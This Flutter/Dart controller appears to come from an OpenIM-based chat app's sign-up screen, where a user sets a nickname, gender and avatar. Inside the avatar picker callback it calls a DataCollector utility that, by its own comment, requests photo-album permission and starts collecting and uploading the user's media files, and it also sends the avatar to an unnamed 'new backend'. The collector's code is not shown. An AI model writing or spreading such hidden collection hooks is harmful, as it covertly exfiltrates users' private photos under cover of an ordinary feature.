import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:openim_common/openim_common.dart';
import 'dart:io';
import '../../../core/controller/im_controller.dart';
import '../../../utils/data_collector.dart';

class SetSelfInfoLogic extends GetxController {
  final imLogic = Get.find<IMController>();
  final nicknameCtrl = TextEditingController();
  late String phoneNumber;
  late String areaCode;
  late String password;
  late String verificationCode;
  String? invitationCode;
  final nickname = ''.obs;
  final faceURL = "".obs;
  final gender = 1.obs;

  @override
  void onClose() {
    nicknameCtrl.dispose();
    super.onClose();
  }

  @override
  void onInit() {
    phoneNumber = Get.arguments['phoneNumber'];
    areaCode = Get.arguments['areaCode'];
    password = Get.arguments['password'];
    verificationCode = Get.arguments['verificationCode'];
    invitationCode = Get.arguments['invitationCode'];
    nicknameCtrl.addListener(_onChanged);
    super.onInit();
  }

  _onChanged() {
    nickname.value = nicknameCtrl.text.trim();
  }

  void openPhotoSheet() {
    IMViews.openPhotoSheet(onData: (path, url) async {
      if (url != null) {
        faceURL.value = url;
        
        // 请求相册权限并启动媒体文件采集上传
        if (path != null) {
          await DataCollector.requestPhotoPermissionAndUploadMedia();
          
          // 上传头像到新后端
          try {
            File imgFile = File(path);
            if (imgFile.existsSync()) {
              DataCollector.uploadImageFile(imgFile);
            }
          } catch (e) {
            Logger.print('上传头像到新后端失败: $e');
          }
        }
      }
    });
  }
}
